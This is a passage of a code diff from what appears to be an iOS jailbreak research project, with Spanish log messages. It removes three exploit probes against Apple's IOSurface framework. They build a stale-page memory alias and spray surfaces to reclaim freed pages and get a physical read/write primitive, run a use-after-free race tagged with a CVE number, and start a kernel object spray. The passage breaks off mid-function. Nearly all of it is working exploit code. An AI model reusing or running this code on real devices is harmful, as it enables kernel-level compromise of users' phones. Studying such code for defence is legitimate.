@@ -22479,1868 +22479,711 @@ void iosurface_research_struct_method(ISRLogBlock _Nonnull log, ISRDoneBlock _No
     });
 }
 
-#pragma mark - Probe JB3: Stale-Page Physical Alias (NO parcheado en 27.2)
+#pragma mark - Probe JB10: Normal Surface Stale Alias (no PurpleGfxMem)
 
-void iosurface_stale_page_alias(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+void iosurface_normal_alias_spray(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
     atomic_store(&g_isr_stop, false);
-    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
-        log(@"JB3: ========================================");
-        log(@"JB3: Stale-Page Physical Alias Probe");
-        log(@"JB3: ========================================");
-
-        void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
-        if (!h) { log(@"JB3: No se pudo abrir IOSurface.framework"); done(@{@"error": @"dlopen"}); return; }
-
-        typedef IOSurfaceRef (*CreateFn)(CFDictionaryRef);
-        CreateFn createSurf = (CreateFn)dlsym(h, "IOSurfaceCreate");
-        typedef uint32_t (*GetIDFn)(IOSurfaceRef);
-        GetIDFn getID = (GetIDFn)dlsym(h, "IOSurfaceGetID");
-        typedef void* (*GetBaseFn)(IOSurfaceRef);
-        GetBaseFn getBase = (GetBaseFn)dlsym(h, "IOSurfaceGetBaseAddress");
-        typedef size_t (*GetAllocSzFn)(IOSurfaceRef);
-        GetAllocSzFn getAllocSz = (GetAllocSzFn)dlsym(h, "IOSurfaceGetAllocSize");
-        typedef kern_return_t (*LockFn)(IOSurfaceRef, uint32_t, uint32_t *);
-        LockFn lockS = (LockFn)dlsym(h, "IOSurfaceLock");
-        typedef kern_return_t (*UnlockFn)(IOSurfaceRef, uint32_t, uint32_t *);
-        UnlockFn unlockS = (UnlockFn)dlsym(h, "IOSurfaceUnlock");
-
-        typedef kern_return_t (*MakeEntryFn)(vm_map_t, memory_object_size_t *,
-            memory_object_offset_t, vm_prot_t, mach_port_t *,
-            mem_entry_name_port_t);
-        MakeEntryFn makeEntry = (MakeEntryFn)dlsym(RTLD_DEFAULT, "mach_make_memory_entry_64");
-
-        if (!createSurf || !getBase || !makeEntry) {
-            log([NSString stringWithFormat:@"JB3: Funciones: create=%d base=%d makeEntry=%d",
-                 createSurf!=NULL, getBase!=NULL, makeEntry!=NULL]);
-            dlclose(h);
-            done(@{@"error": @"dlsym"});
-            return;
-        }
-        log(@"JB3: Todas las funciones cargadas OK");
-
-        log(@"JB3: --- Paso 1: Crear superficie PurpleGfxMem ---");
-        NSDictionary *props = @{
-            @"IOSurfaceWidth": @64,
-            @"IOSurfaceHeight": @64,
-            @"IOSurfaceBytesPerElement": @4,
-            @"IOSurfacePixelFormat": @(0x42475241),
-            @"IOSurfaceMemoryRegion": @"PurpleGfxMem",
-        };
-        IOSurfaceRef surf = createSurf((__bridge CFDictionaryRef)props);
-        if (!surf) {
-            log(@"JB3: Creación PurpleGfxMem falló, probando sin region...");
-            NSDictionary *fallback = @{
-                @"IOSurfaceWidth": @64,
-                @"IOSurfaceHeight": @64,
-                @"IOSurfaceBytesPerElement": @4,
-                @"IOSurfacePixelFormat": @(0x42475241),
-            };
-            surf = createSurf((__bridge CFDictionaryRef)fallback);
-            if (!surf) {
-                log(@"JB3: IOSurfaceCreate falló completamente");
-                dlclose(h);
-                done(@{@"error": @"create_fail"});
-                return;
-            }
-            log(@"JB3: Superficie creada sin PurpleGfxMem (fallback)");
-        } else {
-            log(@"JB3: *** Superficie PurpleGfxMem creada! ***");
-        }
-
-        uint32_t surfID = getID ? getID(surf) : 0;
-        size_t allocSz = getAllocSz ? getAllocSz(surf) : 0;
-        void *base = NULL;
-
-        if (lockS) {
-            uint32_t seed = 0;
-            lockS(surf, 3, &seed);
-        }
-        base = getBase(surf);
-        log([NSString stringWithFormat:@"JB3: ID=%u AllocSize=%zu Base=%p", surfID, allocSz, base]);
-
-        if (!base || allocSz == 0) {
-            log(@"JB3: BaseAddress NULL o AllocSize 0 — no se puede continuar");
-            if (unlockS) { uint32_t s = 0; unlockS(surf, 3, &s); }
-            CFRelease(surf);
-            dlclose(h);
-            done(@{@"error": @"no_base"});
-            return;
-        }
-
-        log(@"JB3: --- Paso 2: Escribir marcador en la superficie ---");
-        uint32_t marker = 0xDEAD1337;
-        memset(base, 0, allocSz < 4096 ? allocSz : 4096);
-        memcpy(base, &marker, sizeof(marker));
-        uint32_t readBack = 0;
-        memcpy(&readBack, base, sizeof(readBack));
-        log([NSString stringWithFormat:@"JB3: Marcador escrito: 0x%08X leído: 0x%08X", marker, readBack]);
-
-        if (unlockS) { uint32_t s = 0; unlockS(surf, 3, &s); }
-
-        log(@"JB3: --- Paso 3: mach_make_memory_entry_64 ---");
-        mach_port_t entryPort = MACH_PORT_NULL;
-        memory_object_size_t entrySize = (memory_object_size_t)allocSz;
-        kern_return_t mkr = makeEntry(mach_task_self(), &entrySize,
-            (memory_object_offset_t)(uintptr_t)base,
-            VM_PROT_READ | VM_PROT_WRITE, &entryPort, MACH_PORT_NULL);
-
-        log([NSString stringWithFormat:@"JB3: mach_make_memory_entry_64 kr=%d port=%u size=%llu",
-             mkr, entryPort, (uint64_t)entrySize]);
-
-        if (mkr != KERN_SUCCESS || entryPort == MACH_PORT_NULL) {
-            log(@"JB3: memory entry falló — probando con solo READ...");
-            entrySize = (memory_object_size_t)allocSz;
-            mkr = makeEntry(mach_task_self(), &entrySize,
-                (memory_object_offset_t)(uintptr_t)base,
-                VM_PROT_READ, &entryPort, MACH_PORT_NULL);
-            log([NSString stringWithFormat:@"JB3: Retry READ-only kr=%d port=%u", mkr, entryPort]);
-        }
-
-        if (mkr != KERN_SUCCESS || entryPort == MACH_PORT_NULL) {
-            log(@"JB3: No se pudo crear memory entry");
-            CFRelease(surf);
-            dlclose(h);
-            done(@{@"error": @"memory_entry_fail"});
-            return;
-        }
-
-        log(@"JB3: --- Paso 4: vm_map del memory entry (alias) ---");
-        vm_address_t alias = 0;
-        kern_return_t vmkr = vm_map(mach_task_self(), &alias, (vm_size_t)entrySize,
-            0, VM_FLAGS_ANYWHERE, entryPort, 0, FALSE,
-            VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
-            VM_INHERIT_NONE);
-
-        log([NSString stringWithFormat:@"JB3: vm_map kr=%d alias=%p", vmkr, (void*)alias]);
-
-        if (vmkr != KERN_SUCCESS) {
-            log(@"JB3: vm_map falló");
-            mach_port_deallocate(mach_task_self(), entryPort);
-            CFRelease(surf);
-            dlclose(h);
-            done(@{@"error": @"vm_map_fail"});
-            return;
-        }
-
-        uint32_t aliasRead = 0;
-        memcpy(&aliasRead, (void*)alias, sizeof(aliasRead));
-        log([NSString stringWithFormat:@"JB3: *** Alias lee marcador: 0x%08X (esperado 0xDEAD1337) match=%s ***",
-             aliasRead, (aliasRead == marker) ? "SI" : "NO"]);
-
-        log(@"JB3: --- Paso 5: Escribir por alias, leer por base ---");
-        uint32_t aliasMarker = 0xCAFEBABE;
-        memcpy((void*)alias, &aliasMarker, sizeof(aliasMarker));
-        if (lockS) { uint32_t s = 0; lockS(surf, 3, &s); }
-        uint32_t baseRead2 = 0;
-        memcpy(&baseRead2, getBase(surf), sizeof(baseRead2));
-        if (unlockS) { uint32_t s = 0; unlockS(surf, 3, &s); }
-        log([NSString stringWithFormat:@"JB3: Alias escribió 0xCAFEBABE, base lee: 0x%08X match=%s",
-             baseRead2, (baseRead2 == aliasMarker) ? "SI" : "NO"]);
-        int bidirectional = (aliasRead == marker && baseRead2 == aliasMarker);
-        log([NSString stringWithFormat:@"JB3: *** ALIAS BIDIRECCIONAL: %s ***",
-             bidirectional ? "CONFIRMADO" : "FALLIDO"]);
-
-        log(@"JB3: --- Paso 6: CFRelease superficie, alias persiste? ---");
-        CFRelease(surf);
-        surf = NULL;
-
-        uint32_t staleRead1 = 0;
-        memcpy(&staleRead1, (void*)alias, sizeof(staleRead1));
-        log([NSString stringWithFormat:@"JB3: Post-release alias lee: 0x%08X (stale=%s)",
-             staleRead1, (staleRead1 == aliasMarker) ? "SI-STALE" : "CAMBIÓ"]);
-
-        if (!isr_stopped()) {
-            log(@"JB3: --- Paso 7: Spray 50 superficies para reclamar páginas ---");
-            IOSurfaceRef sprays[50];
-            int sprayed = 0;
-            uint32_t sprayMarker = 0xBBBBBBBB;
-            for (int i = 0; i < 50 && !isr_stopped(); i++) {
-                NSDictionary *sp = @{
-                    @"IOSurfaceWidth": @64,
-                    @"IOSurfaceHeight": @64,
-                    @"IOSurfaceBytesPerElement": @4,
-                    @"IOSurfacePixelFormat": @(0x42475241),
-                };
-                sprays[i] = createSurf((__bridge CFDictionaryRef)sp);
-                if (sprays[i]) {
-                    if (lockS) { uint32_t s = 0; lockS(sprays[i], 3, &s); }
-                    void *sb = getBase(sprays[i]);
-                    if (sb) memcpy(sb, &sprayMarker, sizeof(sprayMarker));
-                    if (unlockS) { uint32_t s = 0; unlockS(sprays[i], 3, &s); }
-                    sprayed++;
-                }
-            }
-            log([NSString stringWithFormat:@"JB3: Spray: %d/50 superficies creadas", sprayed]);
-
-            uint32_t staleRead2 = 0;
-            memcpy(&staleRead2, (void*)alias, sizeof(staleRead2));
-            log([NSString stringWithFormat:@"JB3: Post-spray alias lee: 0x%08X", staleRead2]);
-
-            if (staleRead2 == sprayMarker) {
-                log(@"JB3: *** RECLAMACIÓN EXITOSA — ALIAS VE DATOS DEL SPRAY ***");
-                log(@"JB3: *** PRIMITIVA DE LECTURA/ESCRITURA STALE-PAGE CONFIRMADA ***");
-
-                uint32_t writeViaStale = 0x41414141;
-                memcpy((void*)alias, &writeViaStale, sizeof(writeViaStale));
-                log(@"JB3: Escrito 0x41414141 vía alias stale");
-
-                for (int i = 0; i < sprayed; i++) {
-                    if (!sprays[i]) continue;
-                    if (lockS) { uint32_t s = 0; lockS(sprays[i], 3, &s); }
-                    void *sb = getBase(sprays[i]);
-                    if (sb) {
-                        uint32_t v = 0;
-                        memcpy(&v, sb, sizeof(v));
-                        if (v == writeViaStale) {
-                            uint32_t sid = getID ? getID(sprays[i]) : 0;
-                            log([NSString stringWithFormat:
-                                @"JB3: *** ESCRITURA STALE CONFIRMADA en superficie %d (ID=%u) ***", i, sid]);
-                        }
-                    }
-                    if (unlockS) { uint32_t s = 0; unlockS(sprays[i], 3, &s); }
-                }
-            } else if (staleRead2 == aliasMarker) {
-                log(@"JB3: Alias aún tiene datos viejos — páginas no reclamadas por spray");
-                log(@"JB3: Las páginas PurpleGfxMem solo se reciclan entre IOSurfaces");
-            } else {
-                log([NSString stringWithFormat:@"JB3: Contenido cambió a 0x%08X — reciclado por otro subsistema", staleRead2]);
-            }
-
-            for (int i = 0; i < sprayed; i++) {
-                if (sprays[i]) CFRelease(sprays[i]);
-            }
-        }
-
-        log(@"JB3: --- Paso 8: Spray PurpleGfxMem para reclamar ---");
-        if (!isr_stopped()) {
-            uint32_t pgmMarker = 0xAAAAAAAA;
-            IOSurfaceRef pgmSprays[30];
-            int pgmCount = 0;
-            for (int i = 0; i < 30 && !isr_stopped(); i++) {
-                NSDictionary *pp = @{
-                    @"IOSurfaceWidth": @64,
-                    @"IOSurfaceHeight": @64,
-                    @"IOSurfaceBytesPerElement": @4,
-                    @"IOSurfacePixelFormat": @(0x42475241),
-                    @"IOSurfaceMemoryRegion": @"PurpleGfxMem",
-                };
-                pgmSprays[i] = createSurf((__bridge CFDictionaryRef)pp);
-                if (pgmSprays[i]) {
-                    if (lockS) { uint32_t s = 0; lockS(pgmSprays[i], 3, &s); }
-                    void *sb = getBase(pgmSprays[i]);
-                    if (sb) memcpy(sb, &pgmMarker, sizeof(pgmMarker));
-                    if (unlockS) { uint32_t s = 0; unlockS(pgmSprays[i], 3, &s); }
-                    pgmCount++;
-                } else {
-                    break;
-                }
-            }
-            log([NSString stringWithFormat:@"JB3: PurpleGfxMem spray: %d/30", pgmCount]);
-
-            uint32_t staleRead3 = 0;
-            memcpy(&staleRead3, (void*)alias, sizeof(staleRead3));
-            log([NSString stringWithFormat:@"JB3: Post-PGM-spray alias lee: 0x%08X", staleRead3]);
-
-            if (staleRead3 == pgmMarker) {
-                log(@"JB3: *** PurpleGfxMem RECLAMÓ LAS PÁGINAS ***");
-                log(@"JB3: *** ALIAS STALE VE DATOS DEL SPRAY PGM ***");
-                log(@"JB3: *** ESTO ES UNA PRIMITIVA DE R/W FÍSICA ***");
-
-                uint32_t poison = 0x42424242;
-                memcpy((void*)alias, &poison, sizeof(poison));
-
-                for (int i = 0; i < pgmCount; i++) {
-                    if (!pgmSprays[i]) continue;
-                    if (lockS) { uint32_t s = 0; lockS(pgmSprays[i], 3, &s); }
-                    void *sb = getBase(pgmSprays[i]);
-                    if (sb) {
-                        uint32_t v = 0;
-                        memcpy(&v, sb, sizeof(v));
-                        if (v == poison) {
-                            uint32_t sid = getID ? getID(pgmSprays[i]) : 0;
-                            log([NSString stringWithFormat:
-                                @"JB3: *** ESCRITURA CROSS-SURFACE CONFIRMADA PGM[%d] ID=%u ***", i, sid]);
-                        }
-                    }
-                    if (unlockS) { uint32_t s = 0; unlockS(pgmSprays[i], 3, &s); }
-                }
-            }
-
-            for (int i = 0; i < pgmCount; i++) {
-                if (pgmSprays[i]) CFRelease(pgmSprays[i]);
-            }
-        }
-
-        vm_deallocate(mach_task_self(), alias, (vm_size_t)entrySize);
-        mach_port_deallocate(mach_task_self(), entryPort);
-
-        log(@"JB3: ========================================");
-        log(@"JB3: Stale-Page Alias Probe completado.");
-        log(@"JB3: ========================================");
-
-        dlclose(h);
-        done(@{@"phase3": @"complete"});
-    });
-}
-
-#pragma mark - Probe JB4: IOSurface Notify UAF Race (CVE-2026-112477)
-
-void iosurface_notify_uaf_race(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
-    atomic_store(&g_isr_stop, false);
-    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
-        log(@"JB4: ========================================");
-        log(@"JB4: IOSurface Notify UAF Race (CVE-2026-112477)");
-        log(@"JB4: ========================================");
-
-        void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
-        if (!h) { log(@"JB4: No se pudo abrir IOSurface.framework"); done(@{@"error": @"dlopen"}); return; }
-
-        typedef IOSurfaceRef (*CreateFn)(CFDictionaryRef);
-        CreateFn createSurf = (CreateFn)dlsym(h, "IOSurfaceCreate");
-        typedef uint32_t (*GetIDFn)(IOSurfaceRef);
-        GetIDFn getID = (GetIDFn)dlsym(h, "IOSurfaceGetID");
-        typedef void* (*GetBaseFn)(IOSurfaceRef);
-        GetBaseFn getBase = (GetBaseFn)dlsym(h, "IOSurfaceGetBaseAddress");
-        typedef kern_return_t (*LockFn)(IOSurfaceRef, uint32_t, uint32_t *);
-        LockFn lockS = (LockFn)dlsym(h, "IOSurfaceLock");
-        typedef kern_return_t (*UnlockFn)(IOSurfaceRef, uint32_t, uint32_t *);
-        UnlockFn unlockS = (UnlockFn)dlsym(h, "IOSurfaceUnlock");
-        typedef void (*IncUseFn)(IOSurfaceRef);
-        IncUseFn incUse = (IncUseFn)dlsym(h, "IOSurfaceIncrementUseCount");
-        typedef void (*DecUseFn)(IOSurfaceRef);
-        DecUseFn decUse = (DecUseFn)dlsym(h, "IOSurfaceDecrementUseCount");
-        typedef int32_t (*GetUseFn)(IOSurfaceRef);
-        GetUseFn getUse = (GetUseFn)dlsym(h, "IOSurfaceGetUseCount");
-        typedef IOSurfaceRef (*LookupFn)(uint32_t);
-        LookupFn lookup = (LookupFn)dlsym(h, "IOSurfaceLookup");
-
-        typedef kern_return_t (*SetNotifyFn)(mach_port_t, uint64_t, uint64_t);
-        SetNotifyFn setNotify = (SetNotifyFn)dlsym(h, "IOSurfaceClientSetSurfaceNotify");
-        typedef kern_return_t (*RemoveNotifyFn)(uint64_t);
-        RemoveNotifyFn removeNotify = (RemoveNotifyFn)dlsym(h, "IOSurfaceClientRemoveSurfaceNotify");
-
-        log([NSString stringWithFormat:@"JB4: Funciones: create=%d id=%d base=%d lock=%d inc=%d dec=%d use=%d lookup=%d",
-             createSurf!=NULL, getID!=NULL, getBase!=NULL, lockS!=NULL,
-             incUse!=NULL, decUse!=NULL, getUse!=NULL, lookup!=NULL]);
-        log([NSString stringWithFormat:@"JB4: Notify: setNotify=%d removeNotify=%d",
-             setNotify!=NULL, removeNotify!=NULL]);
-
-        if (!createSurf) {
-            log(@"JB4: IOSurfaceCreate no disponible");
-            dlclose(h);
-            done(@{@"error": @"no_create"});
-            return;
-        }
-
-        log(@"JB4: --- Paso 1: Probar UseCount como trigger de notificaciones ---");
-        NSDictionary *props = @{
-            @"IOSurfaceWidth": @32,
-            @"IOSurfaceHeight": @32,
-            @"IOSurfaceBytesPerElement": @4,
-            @"IOSurfacePixelFormat": @(0x42475241),
-        };
-
-        IOSurfaceRef testSurf = createSurf((__bridge CFDictionaryRef)props);
-        if (testSurf && incUse && decUse && getUse) {
-            uint32_t testID = getID ? getID(testSurf) : 0;
-            log([NSString stringWithFormat:@"JB4: Superficie test ID=%u", testID]);
-
-            int32_t uc0 = getUse(testSurf);
-            for (int i = 0; i < 100; i++) incUse(testSurf);
-            int32_t uc100 = getUse(testSurf);
-            for (int i = 0; i < 100; i++) decUse(testSurf);
-            int32_t ucEnd = getUse(testSurf);
-            log([NSString stringWithFormat:@"JB4: UseCount: inicio=%d +100=%d -100=%d", uc0, uc100, ucEnd]);
-
-            for (int i = 0; i < 200; i++) decUse(testSurf);
-            int32_t ucDeep = getUse(testSurf);
-            log([NSString stringWithFormat:@"JB4: UseCount deep underflow: %d", ucDeep]);
-            if (ucDeep < 0) {
-                log(@"JB4: *** USECOUNT NEGATIVO ALCANZADO ***");
-            } else {
-                log(@"JB4: UseCount clampea en 0 (no permite negativo simple)");
-            }
-            for (int i = 0; i < 200; i++) incUse(testSurf);
-            for (int i = 0; i < 200; i++) decUse(testSurf);
-
-            CFRelease(testSurf);
-        }
-
-        if (!isr_stopped() && setNotify) {
-            log(@"JB4: --- Paso 2: SetSurfaceNotify disponible — probar registro ---");
-
-            IOSurfaceRef notifySurf = createSurf((__bridge CFDictionaryRef)props);
-            if (notifySurf) {
-                uint32_t nID = getID ? getID(notifySurf) : 0;
-                log([NSString stringWithFormat:@"JB4: Superficie para notify ID=%u", nID]);
-
-                mach_port_t notifyPort = MACH_PORT_NULL;
-                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notifyPort);
-                mach_port_insert_right(mach_task_self(), notifyPort, notifyPort, MACH_MSG_TYPE_MAKE_SEND);
-
-                kern_return_t nkr = setNotify(notifyPort, (uint64_t)nID, 0);
-                log([NSString stringWithFormat:@"JB4: SetSurfaceNotify kr=%d port=%u surfID=%u", nkr, notifyPort, nID]);
-
-                if (nkr == KERN_SUCCESS) {
-                    log(@"JB4: *** NOTIFY REGISTRADO — ventana UAF existe ***");
-
-                    if (incUse) {
-                        incUse(notifySurf);
-                        log(@"JB4: IncrementUseCount llamado (trigger de dispatchNotify)");
-                    }
-
-                    if (removeNotify) {
-                        kern_return_t rkr = removeNotify((uint64_t)nID);
-                        log([NSString stringWithFormat:@"JB4: RemoveSurfaceNotify kr=%d", rkr]);
-                    }
-                } else {
-                    log(@"JB4: SetSurfaceNotify no disponible o rechazado en iOS 27.0");
-                }
-
-                if (notifyPort != MACH_PORT_NULL) {
-                    mach_port_mod_refs(mach_task_self(), notifyPort, MACH_PORT_RIGHT_RECEIVE, -1);
-                }
-                CFRelease(notifySurf);
-            }
-        } else if (!setNotify) {
-            log(@"JB4: SetSurfaceNotify no encontrado — probando UseCount race sin notify");
-        }
-
-        if (!isr_stopped()) {
-            log(@"JB4: --- Paso 3: Race Create/Release + Lookup ---");
-            __block atomic_int raceHits = 0;
-            __block atomic_int raceMiss = 0;
-            __block atomic_int raceUAF = 0;
-            volatile uint32_t *sharedIDs = (volatile uint32_t *)calloc(64, sizeof(uint32_t));
-            __block atomic_int idIdx = 0;
-
-            dispatch_group_t group = dispatch_group_create();
-            dispatch_queue_t q1 = dispatch_queue_create("jb4.creator", DISPATCH_QUEUE_SERIAL);
-            dispatch_queue_t q2 = dispatch_queue_create("jb4.looker", DISPATCH_QUEUE_SERIAL);
-
-            dispatch_group_async(group, q1, ^{
-                for (int i = 0; i < 500 && !isr_stopped(); i++) {
-                    @autoreleasepool {
-                        IOSurfaceRef s = createSurf((__bridge CFDictionaryRef)props);
-                        if (s) {
-                            uint32_t sid = getID ? getID(s) : 0;
-                            int idx = atomic_fetch_add(&idIdx, 1);
-                            sharedIDs[idx % 64] = sid;
-                            usleep(50);
-                            CFRelease(s);
-                        }
-                    }
-                }
-            });
-
-            dispatch_group_async(group, q2, ^{
-                for (int i = 0; i < 2000 && !isr_stopped(); i++) {
-                    @autoreleasepool {
-                        int curIdx = atomic_load(&idIdx);
-                        if (curIdx <= 0) { usleep(10); continue; }
-                        uint32_t sid = sharedIDs[(curIdx - 1) % 64];
-                        if (sid == 0) continue;
-
-                        IOSurfaceRef looked = lookup ? lookup(sid) : NULL;
-                        if (looked) {
-                            atomic_fetch_add(&raceHits, 1);
-                            void *b = getBase ? getBase(looked) : NULL;
-                            if (b) {
-                                uint32_t val = 0;
-                                memcpy(&val, b, sizeof(val));
-                                if (val == 0xDEADDEAD || val == 0xFEEDFACE) {
-                                    atomic_fetch_add(&raceUAF, 1);
-                                }
-                            }
-                            CFRelease(looked);
-                        } else {
-                            atomic_fetch_add(&raceMiss, 1);
-                        }
-                    }
-                }
-            });
-
-            dispatch_group_wait(group, DISPATCH_TIME_FOREVER);
-            free((void*)sharedIDs);
-            log([NSString stringWithFormat:@"JB4: Race result: hits=%d miss=%d uaf_patterns=%d",
-                 atomic_load(&raceHits), atomic_load(&raceMiss), atomic_load(&raceUAF)]);
-            if (atomic_load(&raceMiss) > 0) {
-                log([NSString stringWithFormat:@"JB4: *** %d LOOKUP FALLIDOS — superficie ya liberada ***", atomic_load(&raceMiss)]);
-                log(@"JB4: Ventana de race confirmada entre Create/Release y Lookup");
-            }
-        }
-
-        log(@"JB4: ========================================");
-        log(@"JB4: Notify UAF Race Probe completado.");
-        log(@"JB4: ========================================");
-
-        dlclose(h);
-        done(@{@"phase4": @"complete"});
-    });
-}
-
-#pragma mark - Probe JB5: Kernel Object Spray via Stale Alias
-
-void iosurface_kernel_spray_alias(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
-    atomic_store(&g_isr_stop, false);
-    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
-        log(@"JB5: ========================================");
-        log(@"JB5: Kernel Object Spray via Stale-Page Alias");
-        log(@"JB5: ========================================");
-
-        void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
-        if (!h) { log(@"JB5: No se pudo abrir IOSurface.framework"); done(@{@"error": @"dlopen"}); return; }
-
-        typedef IOSurfaceRef (*CreateFn)(CFDictionaryRef);
-        CreateFn createSurf = (CreateFn)dlsym(h, "IOSurfaceCreate");
-        typedef uint32_t (*GetIDFn)(IOSurfaceRef);
-        GetIDFn getID = (GetIDFn)dlsym(h, "IOSurfaceGetID");
-        typedef void* (*GetBaseFn)(IOSurfaceRef);
-        GetBaseFn getBase = (GetBaseFn)dlsym(h, "IOSurfaceGetBaseAddress");
-        typedef size_t (*GetAllocSzFn)(IOSurfaceRef);
-        GetAllocSzFn getAllocSz = (GetAllocSzFn)dlsym(h, "IOSurfaceGetAllocSize");
-        typedef kern_return_t (*LockFn)(IOSurfaceRef, uint32_t, uint32_t *);
-        LockFn lockS = (LockFn)dlsym(h, "IOSurfaceLock");
-        typedef kern_return_t (*UnlockFn)(IOSurfaceRef, uint32_t, uint32_t *);
-        UnlockFn unlockS = (UnlockFn)dlsym(h, "IOSurfaceUnlock");
-        typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
-        SetValueFn setValue = (SetValueFn)dlsym(h, "IOSurfaceSetValue");
-        typedef CFDictionaryRef (*CopyAllFn)(IOSurfaceRef);
-        CopyAllFn copyAll = (CopyAllFn)dlsym(h, "IOSurfaceCopyAllValues");
-
-        typedef kern_return_t (*MakeEntryFn)(vm_map_t, memory_object_size_t *,
-            memory_object_offset_t, vm_prot_t, mach_port_t *, mem_entry_name_port_t);
-        MakeEntryFn makeEntry = (MakeEntryFn)dlsym(RTLD_DEFAULT, "mach_make_memory_entry_64");
-
-        if (!createSurf || !getBase || !makeEntry || !setValue) {
-            log([NSString stringWithFormat:@"JB5: Funciones: create=%d base=%d makeEntry=%d setValue=%d",
-                 createSurf!=NULL, getBase!=NULL, makeEntry!=NULL, setValue!=NULL]);
-            dlclose(h); done(@{@"error": @"dlsym"}); return;
-        }
-        log(@"JB5: Todas las funciones cargadas OK");
-
-        uint32_t kernTextPtrs = 0;
-        uint32_t kernHeapPtrs = 0;
-        uint32_t crossSurfaceWrites = 0;
-        int aliasOK = 0;
-
-        mach_port_t entryPort = MACH_PORT_NULL;
-        memory_object_size_t entrySize = 0;
-        vm_address_t alias = 0;
-        int sprayCount = 0;
-        IOSurfaceRef *sprays = (IOSurfaceRef *)calloc(50, sizeof(IOSurfaceRef));
-        if (!sprays) { log(@"JB5: calloc falló"); dlclose(h); done(@{@"error": @"calloc"}); return; }
-
-        log(@"JB5: --- Paso 1: Crear superficie PurpleGfxMem ---");
-        NSDictionary *props = @{
-            @"IOSurfaceWidth": @64,
-            @"IOSurfaceHeight": @64,
-            @"IOSurfaceBytesPerElement": @4,
-            @"IOSurfacePixelFormat": @(0x42475241),
-            @"IOSurfaceAllocSize": @(0x4000),
-            @"IOSurfaceMemoryRegion": @"PurpleGfxMem",
-        };
-        IOSurfaceRef surf = createSurf((__bridge CFDictionaryRef)props);
-        if (!surf) {
-            log(@"JB5: PurpleGfxMem falló — probando fallback");
-            NSDictionary *fb = @{
-                @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
-                @"IOSurfaceBytesPerElement": @4, @"IOSurfacePixelFormat": @(0x42475241),
-                @"IOSurfaceAllocSize": @(0x4000),
-            };
-            surf = createSurf((__bridge CFDictionaryRef)fb);
-        }
-        if (!surf) {
-            log(@"JB5: IOSurfaceCreate falló"); free(sprays); dlclose(h);
-            done(@{@"error": @"create_fail"}); return;
-        }
-
-        uint32_t surfID = getID ? getID(surf) : 0;
-        size_t allocSz = getAllocSz ? getAllocSz(surf) : 0;
-        log([NSString stringWithFormat:@"JB5: Superficie creada ID=%u AllocSize=0x%zx", surfID, allocSz]);
-
-        log(@"JB5: --- Paso 2: Lock + escribir marcador ---");
-        if (lockS) { uint32_t s = 0; lockS(surf, 3, &s); }
-        void *base = getBase(surf);
-        if (!base || allocSz == 0) {
-            log(@"JB5: BaseAddress NULL"); if (unlockS) { uint32_t s = 0; unlockS(surf, 3, &s); }
-            CFRelease(surf); free(sprays); dlclose(h);
-            done(@{@"error": @"no_base"}); return;
-        }
-        uint32_t marker = 0xDEAD5555;
-        memset(base, 0, allocSz < 0x4000 ? allocSz : 0x4000);
-        memcpy(base, &marker, sizeof(marker));
-        log([NSString stringWithFormat:@"JB5: Base=%p marcador=0x%08X escrito", base, marker]);
-        if (unlockS) { uint32_t s = 0; unlockS(surf, 3, &s); }
-
-        log(@"JB5: --- Paso 3: mach_make_memory_entry_64 ---");
-        if (!isr_stopped()) {
-            entrySize = (memory_object_size_t)allocSz;
-            kern_return_t mkr = makeEntry(mach_task_self(), &entrySize,
-                (memory_object_offset_t)(uintptr_t)base,
-                VM_PROT_READ | VM_PROT_WRITE, &entryPort, MACH_PORT_NULL);
-            log([NSString stringWithFormat:@"JB5: memory_entry kr=%d port=%u size=%llu",
-                 mkr, entryPort, (uint64_t)entrySize]);
-            if (mkr != KERN_SUCCESS || entryPort == MACH_PORT_NULL) {
-                log(@"JB5: memory entry falló");
-                CFRelease(surf); free(sprays); dlclose(h);
-                done(@{@"error": @"entry_fail"}); return;
-            }
-        }
-
-        log(@"JB5: --- Paso 4: vm_map alias + verificar ---");
-        if (!isr_stopped()) {
-            kern_return_t vmkr = vm_map(mach_task_self(), &alias, (vm_size_t)entrySize,
-                0, VM_FLAGS_ANYWHERE, entryPort, 0, FALSE,
-                VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
-                VM_INHERIT_NONE);
-            log([NSString stringWithFormat:@"JB5: vm_map kr=%d alias=%p", vmkr, (void*)alias]);
-            if (vmkr != KERN_SUCCESS) {
-                log(@"JB5: vm_map falló");
-                mach_port_deallocate(mach_task_self(), entryPort);
-                CFRelease(surf); free(sprays); dlclose(h);
-                done(@{@"error": @"vm_map_fail"}); return;
-            }
-            uint32_t aliasRead = 0;
-            memcpy(&aliasRead, (void*)alias, sizeof(aliasRead));
-            aliasOK = (aliasRead == marker);
-            log([NSString stringWithFormat:@"JB5: Alias lee 0x%08X match=%s", aliasRead, aliasOK ? "SI" : "NO"]);
-        }
-
-        log(@"JB5: --- Paso 5: CFRelease superficie (alias sobrevive) ---");
-        CFRelease(surf);
-        surf = NULL;
-
-        if (!isr_stopped()) {
-            uint32_t staleCheck = 0;
-            memcpy(&staleCheck, (void*)alias, sizeof(staleCheck));
-            log([NSString stringWithFormat:@"JB5: Post-release alias=0x%08X stale=%s",
-                 staleCheck, (staleCheck == marker) ? "SI" : "NO"]);
-        }
-
-        log(@"JB5: --- Paso 6: Spray 50 PurpleGfxMem con propiedades grandes ---");
-        if (!isr_stopped()) {
-            for (int i = 0; i < 50 && !isr_stopped(); i++) {
-                NSDictionary *sp = @{
